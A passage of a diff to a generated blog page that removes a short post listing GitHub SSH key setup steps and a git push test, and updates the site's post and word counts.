-<li>ssh-keygen -t rsa -b 4096 -C “<a href="mailto:643008933@qq.com" target="_blank" rel="noopener">643008933@qq.com</a>“<ul>
-<li>Enter a file in which to save the key (/c/Users/you/.ssh/id_rsa):[Press enter]</li>
-<li>Enter passphrase (empty for no passphrase): [Type a passphrase]</li>
-<li>Enter same passphrase again: [Type passphrase again]</li>
-</ul>
-</li>
-<li>eval $(ssh-agent -s)</li>
-<li>ssh-add ~/.ssh/id_rsa</li>
-<li>cat ~/.ssh/id_rsa.public</li>
-<li>复制公钥到New SSH Key</li>
-</ul>
-</li>
-<li>git clone with SSH</li>
-<li>touch a.txt</li>
-<li>git add a.txt</li>
-<li>git commit -m “add a.txt”</li>
-<li>git push（看是否需要账号密码登陆）</li>
-</ul>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
   </section>
 
   
@@ -2950,7 +3409,7 @@
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">151</span>
+                  <span class="site-state-item-count">152</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
@@ -3057,7 +3516,7 @@
     
       <span class="post-meta-item-text">Site words total count&#58;</span>
     
-    <span title="Site words total count">135.4k</span>
+    <span title="Site words total count">136.4k</span>
   
 </div>
 
